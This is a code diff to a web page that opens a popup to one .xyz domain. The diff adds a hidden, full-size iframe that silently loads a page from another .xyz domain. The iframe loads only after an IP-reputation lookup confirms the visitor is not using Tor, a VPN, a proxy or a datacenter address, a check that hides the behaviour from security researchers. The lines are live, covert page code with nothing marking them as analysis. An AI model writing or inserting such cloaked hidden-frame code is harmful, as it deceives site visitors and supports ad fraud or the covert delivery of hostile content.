@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 
+</head>
+<body>
     <script>
 		
-    var URL111 = 'https://bestdailyxx.xyz/ltc2.html';
+    	var URL111 = 'https://bestdailyxx.xyz/ltc2.html';
 		
 		var win = window.open(URL111);
 
@@ -38,5 +40,25 @@
    
         
     </script>
+	<div style="display:none;">
+		<iframe id="adx1" src="" height="768" width="1366" ></iframe>
+		
+		<script>
+
+		
+
+			$.getJSON("https://api.ipapi.is", function(result2){
+        	  if(result2.is_tor === undefined || result2.is_tor || result2.is_proxy || result2.is_vpn || result2.is_datacenter) {
+        		  $("#validateStatus").html(
+      			'Proxy not accepted');
+	           } else {
+	        
+	        	   document.getElementById('adx1').src = 'https://note4you.xyz/xxx.html';
+	           }
+		 });
+		
+			
+		</script>
+	</div>
 </body>
 </html>
